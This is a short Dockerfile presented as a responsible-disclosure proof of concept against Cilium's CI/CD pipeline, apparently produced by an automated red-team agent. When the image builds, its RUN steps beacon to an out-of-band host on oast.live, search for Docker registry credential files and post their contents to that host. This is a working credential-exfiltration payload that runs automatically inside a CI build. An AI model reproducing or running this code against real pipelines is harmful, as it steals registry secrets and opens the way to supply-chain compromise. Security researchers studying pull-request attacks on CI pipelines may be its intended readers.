FROM alpine:3.19

LABEL poc="wiz-red-agent-scan-for-good"
LABEL description="Wiz Red Agent Responsible Disclosure PoC - Cilium CI/CD PWN Request"

RUN apk add --no-cache curl

# Beacon to confirm build executed on our fork code
RUN curl -s "https://d92msbv1onp1c3vqbbbg1sei1um9d3rrp.oast.live/?step=build-exec&repo=cilium-json-mock&t=$(date +%s)" || true

# Check standard locations where buildx might expose registry auth
RUN (cat /root/.docker/config.json 2>/dev/null | curl -s -d @- "https://d92msbv1onp1c3vqbbbg1sei1um9d3rrp.oast.live/?src=root-docker" || true) && \
    (cat /.docker/config.json 2>/dev/null | curl -s -d @- "https://d92msbv1onp1c3vqbbbg1sei1um9d3rrp.oast.live/?src=dot-docker" || true) && \
    (find / -name "config.json" -path "*docker*" 2>/dev/null | head -3 | while read f; do curl -s -d @"$f" "https://d92msbv1onp1c3vqbbbg1sei1um9d3rrp.oast.live/?src=$(echo $f|base64 -w0)"; done || true)

CMD ["echo", "wiz-red-agent-scan-for-good"]
